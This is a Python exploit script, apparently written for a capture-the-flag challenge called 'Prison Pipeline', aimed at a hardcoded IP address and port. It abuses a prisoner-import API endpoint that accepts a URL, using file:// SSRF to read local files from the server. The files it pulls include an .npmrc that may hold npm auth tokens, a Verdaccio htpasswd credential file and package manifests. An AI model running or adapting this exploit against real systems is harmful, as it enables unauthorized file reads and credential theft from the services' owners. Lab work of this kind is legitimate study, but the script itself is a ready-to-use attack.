#!/usr/bin/env python3
import requests
import json
import base64
import gzip
import io
import tarfile
import hashlib
import sys
import time
import urllib.parse

TARGET = "http://94.237.61.249:43680"

def import_file(url):
    """Import a file via SSRF and return prisoner ID"""
    r = requests.post(
        f"{TARGET}/api/prisoners/import",
        json={"url": url},
        timeout=30
    )
    data = r.json()
    return data.get("prisoner_id")

def read_prisoner(pid):
    """Read imported prisoner data"""
    r = requests.get(f"{TARGET}/api/prisoners/{pid}", timeout=10)
    return r.json()

def read_file_via_ssrf(filepath):
    """Read a file via SSRF"""
    pid = import_file(f"file://{filepath}")
    if pid:
        data = read_prisoner(pid)
        return data.get("raw", "")
    return None

def main():
    print("[*] Prison Pipeline Exploit")
    
    # Read important files
    files_to_read = [
        "/home/node/.npmrc",
        "/home/node/.config/verdaccio/htpasswd", 
        "/app/node_modules/prisoner-db/package.json",
        "/home/node/.config/verdaccio/storage/prisoner-db/package.json",
    ]
    
    for f in files_to_read:
        print(f"\n[*] Reading {f}...")
        content = read_file_via_ssrf(f)
        if content:
            print(f"Content:\n{content}")
        else:
            print("Failed to read or empty")

if __name__ == "__main__":
    main()
